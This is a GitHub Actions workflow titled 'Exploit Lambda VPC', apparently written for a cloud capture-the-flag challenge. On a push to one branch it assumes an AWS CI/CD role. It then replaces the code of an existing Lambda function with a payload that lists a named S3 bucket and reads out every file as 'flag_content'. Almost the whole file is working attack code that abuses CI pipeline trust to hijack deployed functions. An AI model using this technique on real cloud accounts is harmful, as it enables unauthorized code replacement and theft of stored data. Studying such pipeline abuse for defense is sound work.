name: Exploit Lambda VPC

on:
  push:
    branches: [ "corgi" ]

jobs:
  deploy-and-invoke:
    runs-on: ubuntu-latest
    permissions:
      id-token: write
      contents: read
    steps:
      - name: Checkout Code
        uses: actions/checkout@v4

      - name: Configure AWS Credentials
        uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: arn:aws:iam::009661764077:role/cicdRole
          aws-region: us-east-1

      - name: Create and Deploy Lambda Payload
        run: |
          cat << 'EOF' > lambda_function.py
          import json
          import boto3

          def lambda_handler(event, context):
              s3 = boto3.client('s3')
              bucket_name = 'site781fe43f26b9eba3'
              try:
                  response = s3.list_objects_v2(Bucket=bucket_name)
                  files = [obj['Key'] for obj in response.get('Contents', [])]
                  
                  flag_content = ""
                  for file in files:
                      obj = s3.get_object(Bucket=bucket_name, Key=file)
                      try:
                          content = obj['Body'].read().decode('utf-8')
                          flag_content += f"\n=== {file} ===\n{content}\n"
                      except Exception:
                          pass
                          
                  result_data = {
                      "files": files,
                      "flag_content": flag_content
                  }
              except Exception as e:
                  result_data = {"error": str(e)}

              return {
                  "statusCode": 200,
                  "body": json.dumps(result_data)
              }
          EOF

          zip function.zip lambda_function.py
          aws lambda update-function-code --function-name nslookupv2 --zip-file fileb://function.zip
          echo "Lambda function updated successfully!"
